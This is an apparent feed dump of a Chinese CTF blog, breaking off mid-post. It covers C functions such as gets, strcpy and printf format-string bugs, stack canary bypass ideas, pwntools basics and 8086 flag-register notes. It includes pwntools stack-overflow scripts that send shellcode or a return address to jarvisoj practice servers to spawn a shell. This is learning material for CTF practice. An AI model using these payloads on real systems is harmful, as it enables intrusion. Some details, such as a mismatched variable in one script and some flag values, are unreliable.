id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h3><p>write()会把参数buf 所指的内存写入nbytes 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动.</p><h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>如果顺利write()会返回实际写入的字节数.<br>当有错误发生时则返回-1, 错误代码存入errno 中.</p><p>错误代码：</p><ul><li>EINTR 此调用被信号所中断.</li><li>EAGAIN 当使用不可阻断I/O 时 (O_NONBLOCK), 若无数据可读取则返回此值.</li><li>EADF 参数fd 非有效的文件描述词, 或该文件已关闭</li></ul><h2 id="0x02-gets"><a href="#0x02-gets" class="headerlink" title="0x02 gets()"></a>0x02 gets()</h2><h3 id="函数原型-2"><a href="#函数原型-2" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line">char *gets(char *str);</span><br></pre></td></tr></table></figure><h3 id="功能-2"><a href="#功能-2" class="headerlink" title="功能"></a>功能</h3><p>gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。这就意味着，如果前面使用过 gets()，而后面又要从键盘给字符变量赋值的话就不需要吸收回车清空缓冲区了，因为缓冲区的回车已经被 gets() 取出来扔掉了</p><p>gets() 时有空格也可以直接输入，但是 gets() 有一个非常大的缺陷，即它不检查预留存储区是否能够容纳实际输入的数据，换句话说，如果输入的字符数目大于数组的长度，gets 无法检测到这个问题，就会发生内存越界。</p><h2 id="0x03-strcpy-和memcpy-和strncpy"><a href="#0x03-strcpy-和memcpy-和strncpy" class="headerlink" title="0x03 strcpy()和memcpy()和strncpy()"></a>0x03 strcpy()和memcpy()和strncpy()</h2><h3 id="函数原型-3"><a href="#函数原型-3" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char* strcpy(char* dest, const char* src)</span><br><span class="line">void *memcpy( void *dest, const void *src, size_t count );</span><br><span class="line">char *strncpy(char *dest,char *src,int size_t n);</span><br></pre></td></tr></table></figure><p>dest:指向用于存储复制内容的目标数组。<br>src:要复制的字符串。<br>count：要读入文件指定的字节数；</p><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><ul><li>strcpy提供了字符串的复制。即strcpy只用于字符串复制，并且它不仅复制字符串内容之外，还会复制字符串的结束符’\0’。</li><li>复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符数组、整型、结构体、类等。</li><li>复制的方法不同。strcpy不需要指定长度，它遇到被复制字符的串结束符”\0”才结束，所以容易溢出。memcpy则是根据其第3个参数决定复制的长度。</li><li>用途不同。通常在复制字符串时用strcpy，而需要复制其他类型数据时则一般用memcpy</li><li>strncpy函数，只是将src的前n个字符复制到dest的前n个字符，不自动添加’\0’。如果src的长度小于n个字节，则以NULL填充dest直到复制完n个字节</li></ul><h2 id="0x04-printf-和scanf"><a href="#0x04-printf-和scanf" class="headerlink" title="0x04 printf()和scanf()"></a>0x04 printf()和scanf()</h2><h3 id="scanf函数"><a href="#scanf函数" class="headerlink" title="scanf函数"></a>scanf函数</h3><p>scanf(“%d %d”,&amp;a,&amp;b);<br>遇到空格(0x20)停止读取</p><h3 id="printf函数"><a href="#printf函数" class="headerlink" title="printf函数"></a>printf函数</h3><p>printf(“%s”, i);<br>输出直到\x00</p><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><p>通常来说，我们会使用printf([格式化字符串]，参数)的形式来进行调用，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char s[20] = “Hello world!\n”;</span><br><span class="line">printf(“%s”, s);</span><br></pre></td></tr></table></figure></p><p>然而，有时候为了省事也会写成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char s[20] = “Hello world!\n”;</span><br><span class="line">printf(s);</span><br></pre></td></tr></table></figure></p><p>事实上，这是一种非常危险的写法。由于printf函数族的设计缺陷，当其第一个参数可被控制时，攻击者将有机会对任意内存地址进行读写操作。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-read&quot;&gt;&lt;a href=&quot;#0x00-read&quot; class=&quot;headerlink&quot; title=&quot;0x00 read()&quot;&gt;&lt;/a&gt;0x00 read()&lt;/h2&gt;&lt;h3 id=&quot;函数原型&quot;&gt;&lt;a href=&quot;#函数原型&quot; class=&quot;head
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>stack canary绕过思路</title>
    <link href="https://nocbtm.github.io/2018/10/24/stack-canary%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"/>
    <id>https://nocbtm.github.io/2018/10/24/stack-canary绕过思路/</id>
    <published>2018-10-24T10:59:43.000Z</published>
    <updated>2019-10-01T08:38:39.245Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-canary保护机制"><a href="#0x00-canary保护机制" class="headerlink" title="0x00 canary保护机制"></a>0x00 canary保护机制</h2><p>我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖ebp、eip等，从而达到劫持控制流的目的。然而stack canary这一技术的应用使得这种利用手段变得难以实现。</p><p>canary保护机制是在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的canary值（最后两位必须是00），栈帧销毁前测试该值是否“死掉”，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。</p><p>如图var-c就是canary的地址，如果触发了栈溢出漏洞，还不知道canary的值，就会执行__stack_chk_fail函数。<br><img alt="" data-src="https://i.imgur.com/0XkugWG.png" class="lozad"><br><img alt="" data-src="https://i.imgur.com/iXZEDP4.png" class="lozad"></p><h2 id="0x01-泄露canary"><a href="#0x01-泄露canary" class="headerlink" title="0x01 泄露canary"></a>0x01 泄露canary</h2><p>泄露canary的方法有：</p><ul><li>通过格式化字符串漏洞来泄露canary的值</li><li>通过栈溢出漏洞来泄露canary的值</li><li>多进程程序的canary爆破</li><li>利用__stack_chk_fail函数泄露信息<br>当然具体问题还要具体分析</li></ul><p>未完待续。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-canary保护机制&quot;&gt;&lt;a href=&quot;#0x00-canary保护机制&quot; class=&quot;headerlink&quot; title=&quot;0x00 canary保护机制&quot;&gt;&lt;/a&gt;0x00 canary保护机制&lt;/h2&gt;&lt;p&gt;我们知道，通常栈溢出的利用方式是通过
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>oj level0和level1总结</title>
    <link href="https://nocbtm.github.io/2018/09/21/oj-level0%E5%92%8Clevel1%E6%80%BB%E7%BB%93/"/>
    <id>https://nocbtm.github.io/2018/09/21/oj-level0和level1总结/</id>
    <published>2018-09-21T11:42:51.000Z</published>
    <updated>2019-10-01T08:40:47.439Z</updated>
    
    <content type="html"><![CDATA[<p>做题之前，需要知道pwntools的基本用法，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &apos;i386&apos;, os = &apos;linux&apos;)   ;设置目标机的信息</span><br><span class="line"></span><br><span class="line">r = remote(&apos;exploitme.example.com&apos;, 31337)  ;用来建立一个远程连接，url或者ip作为地址</span><br><span class="line">                                  然后指明端口,这里也可以仅仅使用本地文件,调试时方便:</span><br><span class="line"></span><br><span class="line">r.send(asm(shellcraft.sh()))       ;r.send()将shellcode发送到远程连接</span><br><span class="line"></span><br><span class="line">r.interactive()                    ;将控制权交给用户，这样就可以使用打开的shell了</span><br></pre></td></tr></table></figure></p><p>ps：具体的可以看我的另一篇博客</p><p>还需要知道pwn的一般套路，这里我只说说栈溢出的基本套路：</p><ul><li>找到栈溢出地址（就是搞事情的地址），基本上都是buf的地址，这个地址需要用pwntools中的p32或p64进行转换，（若程序是32位的就用p32）才能用pwntools中的sendline发送到远程连接</li><li>构建shellcode，用一句话就行shellcode = asm(shellcraft.sh())</li><li>构建payload，payload的基本构建：payload=shellcode+’a’*一个长度+p32(buf_addr)，次序一定不能乱</li><li>最后就可以发送payload，进行交互，得到shell的控制权，然后ls ，cat flag<img alt="" data-src="https://i.imgur.com/rCwB8hx.png" class="lozad"></li></ul><h2 id="level0的脚本如下："><a href="#level0的脚本如下：" class="headerlink" title="level0的脚本如下："></a>level0的脚本如下：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">s_addr=0x400596</span><br><span class="line">r=remote(&quot;pwn2.jarvisoj.com&quot;,9881)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;a&apos;*0x80+&apos;a&apos;*8+p64(s_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>解释如下：<br>level0是最简单的也是最基本的，这个题有一个函数callsystem，直接返回一个system（”/bin/sh”)也就是返回一个命令框，这就是我们想要的，所以不用构建shellcode和paload了<br><img alt="" data-src="https://i.imgur.com/XZRbADf.png" class="lozad"><br>脚本里的’a’<em>0x80+’a’</em>8代表的是如下图的两个数据，0x80是申请的总共地址，而8在buf的最下方<img alt="" data-src="https://i.imgur.com/tHfJ9kZ.png" class="lozad"><br><img alt="" data-src="https://i.imgur.com/HRyGj3Z.png" class="lozad"></p><p>s_addr=0x400596代表的是函数callsystem的地址<img alt="" data-src="https://i.imgur.com/DDtBv0g.png" class="lozad"></p><h2 id="level1的脚本如下："><a href="#level1的脚本如下：" class="headerlink" title="level1的脚本如下："></a>level1的脚本如下：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io = remote(&apos;pwn2.jarvisoj.com&apos;, 9877)</span><br><span class="line">text = io.recvline()[14: -2]</span><br><span class="line"></span><br><span class="line">buf_addr = int(text, 16)</span><br><span class="line"></span><br><span class="line">payload = shellcode + &apos;a&apos; * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>解释如下：<br>这里我只解释主要思路不明白如下两句话的可以百度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure></p><p>[14:-2]只是python里面的一个切片，代表”What’sthis:0xffee6c50?”<br>这句话取第14个到倒数第二个字符<br>这里的text为buf的地址，只不过是字符型的，需要int（text，16）用16进制的方法转化为int型</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;做题之前，需要知道pwntools的基本用法，如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cla
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwntools</title>
    <link href="https://nocbtm.github.io/2018/09/19/pwntools/"/>
    <id>https://nocbtm.github.io/2018/09/19/pwntools/</id>
    <published>2018-09-19T13:32:24.000Z</published>
    <updated>2019-10-01T08:39:17.277Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>pwntools是一个ctf框架和漏洞利用开发库，用python开发，旨在让使用者简单快速的编写exploit。<br>python2安装方法： sudo pip install pwntools<br>python3安装方法： sudo pip3 install pwntools</p><h2 id="IO模块"><a href="#IO模块" class="headerlink" title="IO模块"></a>IO模块</h2><p>下面给出了PwnTools中的主要IO函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">send(data) : 发送数据</span><br><span class="line">sendline(data) : 发送一行数据，相当于在末尾加\n</span><br><span class="line"></span><br><span class="line">recv(numb=4096, timeout=default) : 给出接收字节数,timeout指定超时</span><br><span class="line">recvuntil(delims, drop=False) : 接收到delims的pattern</span><br><span class="line">（以下可以看作until的特例）</span><br><span class="line">recvline(keepends=True) : 接收到\n，keepends指定保留\n</span><br><span class="line">recvall() : 接收到EOF</span><br><span class="line">recvrepeat(timeout=default) : 接收到EOF或timeout</span><br><span class="line"></span><br><span class="line">interactive() : 与shell交互</span><br></pre></td></tr></table></figure></p><h2 id="ELF模块"><a href="#ELF模块" class="headerlink" title="ELF模块"></a>ELF模块</h2><p>ELF模块用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很相似。</p><p>下面演示了：获取基地址、获取函数地址（基于符号）、获取函数got地址、获取函数plt地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e = ELF(&apos;/bin/cat&apos;)</span><br><span class="line">&gt;&gt;&gt; print hex(e.address)  # 文件装载的基地址</span><br><span class="line">0x400000</span><br><span class="line">&gt;&gt;&gt; print hex(e.symbols[&apos;write&apos;]) # 函数地址</span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt; print hex(e.got[&apos;write&apos;]) # GOT表的地址</span><br><span class="line">0x60b070</span><br><span class="line">&gt;&gt;&gt; print hex(e.plt[&apos;write&apos;]) # PLT的地址</span><br><span class="line">0x401680</span><br></pre></td></tr></table></figure></p><h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h2><p>主要是对整数进行打包，就是转换成二进制的形式，比如转换成地址。p32、p64是打包，u32、u64是解包。<br>数据打包,即将整数值转换为32位或者64位地址一样的表示方式,比如0x400010表示为\x10\x00\x40一样,这使得我们构造payload变得很方便</p><p>用法: </p><ul><li>p32/p64: 打包一个整数,分别打包为32或64位 </li><li>u32/u64: 解包一个字符串,得到整数</li></ul><h2 id="大致框架"><a href="#大致框架" class="headerlink" title="大致框架"></a>大致框架</h2><p>官网的一个简单样例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &apos;i386&apos;, os = &apos;linux&apos;)   ;设置目标机的信息</span><br><span class="line"></span><br><span class="line">r = remote(&apos;exploitme.example.com&apos;, 31337)  ;用来建立一个远程连接，url或者ip作为地址</span><br><span class="line">                                  然后指明端口,这里也可以仅仅使用本地文件,调试时方便:</span><br><span class="line"></span><br><span class="line">r.send(asm(shellcraft.sh()))       ;r.send()将shellcode发送到远程连接</span><br><span class="line"></span><br><span class="line">r.interactive()                    ;将控制权交给用户，这样就可以使用打开的shell了</span><br></pre></td></tr></table></figure><h2 id="Context设置"><a href="#Context设置" class="headerlink" title="Context设置"></a>Context设置</h2><p>context是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p><p>一般来说我们设置context只需要简单的一句话:</p><p>context(os=’linux’, arch=’amd64’, log_level=’debug’)</p><p>这句话的意思是： </p><ol><li>os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux </li><li>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ </li><li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</li></ol><h2 id="汇编与shellcode"><a href="#汇编与shellcode" class="headerlink" title="汇编与shellcode"></a>汇编与shellcode</h2><p>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode，即调用/bin/sh可以通过shellcraft得到：</p><p>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(shellcraft.sh()) # 打印出shellcode</span><br></pre></td></tr></table></figure></p><p>不过，现在我们看到的shellcode还是汇编代码，不是能用的机器码，所以还需要进行一次汇编<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(asm(shellcraft.sh())) # 打印出汇编后的shellcode</span><br></pre></td></tr></table></figure></p><p>asm可以对汇编代码进行汇编，不过pwntools目前的asm实现还有一些缺陷，比如不能支持相对跳转等等，只可以进行简单的汇编操作。如果需要更复杂一些的汇编功能，可以使用keystone-engine项目，这里就不再赘述了。</p><p>asm也是架构相关，所以一定要先设置context，避免一些意想不到的错误。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;pwntools&quot;&gt;&lt;a href=&quot;#pwntools&quot; class=&quot;headerlink&quot; title=&quot;pwntools&quot;&gt;&lt;/a&gt;pwntools&lt;/h2&gt;&lt;p&gt;pwntools是一个ctf框架和漏洞利用开发库，用python开发，旨在让使用者简单快速的
      
    
    </summary>
    
      <category term="pwntools" scheme="https://nocbtm.github.io/categories/pwntools/"/>
    
    
      <category term="pwntools" scheme="https://nocbtm.github.io/tags/pwntools/"/>
    
  </entry>
  
  <entry>
    <title>cmp指令</title>
    <link href="https://nocbtm.github.io/2018/09/16/cmp%E6%8C%87%E4%BB%A4/"/>
    <id>https://nocbtm.github.io/2018/09/16/cmp指令/</id>
    <published>2018-09-16T08:16:31.000Z</published>
    <updated>2019-10-01T08:41:49.139Z</updated>
    
    <content type="html"><![CDATA[<p>cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。<br>cmp指令格式：cmp操作对象1，操作对象2<br>功能：计算操作对象1-操作对象2但不保存结果，仅仅根据计算结果对标志寄存器进行设置。</p><p>指令cmp ax，bx的逻辑含义是比较ax，bx中的值，如果执行后：<br>zf=1，说明(ax)=(bx)<br>zf=0，说明（ax）不等于（bx）<br>cf=1，说明（ax）&lt;(bx)<br>cf=0，说明（ax)&gt;=(bx)<br>cf=0且zf=0，说明（ax）&gt;(bx)<br>cf=1或zf=1,说明(ax)&lt;=(bx）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。&lt;br&gt;cmp指令格式：cmp操作对象1，操作对象2&lt;br&gt;功能：计算操作对象1-操作对象2但不保存结果，仅仅根据计算结果对标志寄存器进行设置。&lt;/p&gt;
&lt;p&gt;指令cmp ax，bx的逻辑含义是比较ax，bx中的
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>sbb指令</title>
    <link href="https://nocbtm.github.io/2018/09/16/sbb%E6%8C%87%E4%BB%A4/"/>
    <id>https://nocbtm.github.io/2018/09/16/sbb指令/</id>
    <published>2018-09-16T08:16:16.000Z</published>
    <updated>2019-10-01T08:38:49.585Z</updated>
    
    <content type="html"><![CDATA[<p>sbb是带减法指令，它利于了CF位上记录的错位置。<br>指令格式：sbb 操作对象1，操作对象2<br>功能：操作对象1=操作对象1-操作对象2-CF<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov bx,1000H</span><br><span class="line">mov ax,003EH</span><br><span class="line">sub bx,2000H</span><br><span class="line">sbb ax,0020H</span><br></pre></td></tr></table></figure></p><p>sbb指令执行后，将对CF进行设置。利用sbb指令可以对任意大的数据进行减法运算。上面程序，就是计算003E1000H-00202000H</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;sbb是带减法指令，它利于了CF位上记录的错位置。&lt;br&gt;指令格式：sbb 操作对象1，操作对象2&lt;br&gt;功能：操作对象1=操作对象1-操作对象2-CF&lt;br&gt;例如：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>adc指令</title>
    <link href="https://nocbtm.github.io/2018/09/16/adc%E6%8C%87%E4%BB%A4/"/>
    <id>https://nocbtm.github.io/2018/09/16/adc指令/</id>
    <published>2018-09-16T06:52:54.000Z</published>
    <updated>2019-10-01T08:44:27.604Z</updated>
    
    <content type="html"><![CDATA[<p>adc是带进位加法指令<br>指令格式：adc 操作对象1，操作对象2<br>功能：操作对象1=操作对象1+操作对象2+CF</p><p>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2</span><br><span class="line">mov bx,1</span><br><span class="line">sub bx,ax</span><br><span class="line">adc ax,1</span><br></pre></td></tr></table></figure></p><p>执行后，（ax）=4,abc执行时想，相当于计算：（ax）+1+CF=2+1+1=4<br>adc指令的目的，就是来进行假发的第二步运算的。adc指令和add指令相配合就可以对更大的数据进行加法运算。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;adc是带进位加法指令&lt;br&gt;指令格式：adc 操作对象1，操作对象2&lt;br&gt;功能：操作对象1=操作对象1+操作对象2+CF&lt;/p&gt;
&lt;p&gt;例如：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>检测点11.1 </title>
    <link href="https://nocbtm.github.io/2018/09/16/%E6%A3%80%E6%B5%8B%E7%82%B911-1/"/>
    <id>https://nocbtm.github.io/2018/09/16/检测点11-1/</id>
    <published>2018-09-16T06:29:30.000Z</published>
    <updated>2019-10-01T08:26:29.457Z</updated>
    
    <content type="html"><![CDATA[<p>写出下面每条指令执行后，ZF、PF、SF、等标志位的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sub al,al     al=0h        ZF=1        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">mov al,1      al=1h        ZF=1        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">push ax       ax=1h        ZF=1        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">pop bx        bx=1h        ZF=1        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">add al,bl     al=2h        ZF=0        PF=0        SF=0 </span><br><span class="line"></span><br><span class="line">add al,10     al=12h       ZF=0        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">mul al        ax=144h      ZF=0        PF=1        SF=0</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;写出下面每条指令执行后，ZF、PF、SF、等标志位的值。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span c
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>标志寄存器</title>
    <link href="https://nocbtm.github.io/2018/09/16/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <id>https://nocbtm.github.io/2018/09/16/标志寄存器/</id>
    <published>2018-09-16T03:55:49.000Z</published>
    <updated>2019-10-01T08:38:09.006Z</updated>
    
    <content type="html"><![CDATA[<p>标志寄存器（简称flag）的作用：<br>（1）用来存储相关指令的某些执行结果。<br>（2）用来为CPU执行相关指令提供行为依据。<br>（3）用来控制CPU的相关工作方式。<br>flag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器死按位起作用的，它的每一位都有专门的含义，记录特定的信息。<img alt="" data-src="https://i.imgur.com/p2T0oAQ.png" class="lozad"></p><p>flag的1,3,5,12,13,14,15位在8086CPU中没有使用，不具有任何含义</p><h2 id="ZF标志"><a href="#ZF标志" class="headerlink" title="ZF标志"></a>ZF标志</h2><p>flag的第六位是ZF，零标志位。它记录相关指令执行后，其结果是否为0.如果结果为0，那么zf=1，如果结果不为0，那么zf=0</p><p>例如指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure></p><p>执行后，结果为0，则zf=1</p><h2 id="PF标志"><a href="#PF标志" class="headerlink" title="PF标志"></a>PF标志</h2><p>flag的第二位是PF，奇偶标志位，它记录相关指令执行后，其结果的所有bit位中1的个数是否位偶数。如果1的个数为偶数，pf=1，如果为奇数，那么pf=0<br>比如指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">add al,10</span><br></pre></td></tr></table></figure></p><p>执行后，结果为00001011B，其中有3个1，则pf=0</p><h2 id="SF标志"><a href="#SF标志" class="headerlink" title="SF标志"></a>SF标志</h2><p>flag的第七位是SF，符号标志位，它记录相关指令后，其结果是否为负。如果结果为负，sf=1，如果不为负，sf=0<br>计算机通常用补码来表示有符号数据。计算机的UI个数据可以看做是由富豪书，也可以看做成无符号数。比如：<br>00000001B，可以看做无符号数1，或有符号数+1；<br>10000001B，可以看做无符号数129，也可以看作有符号数-127<br>不管我们如何看待，CPU在执行add等指令的时候，就已经包含了两种含义，也将得到同一种信息来记录的两种结果。关键在于我们的程序需要哪一种结果。<br>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,10000001B</span><br><span class="line">add 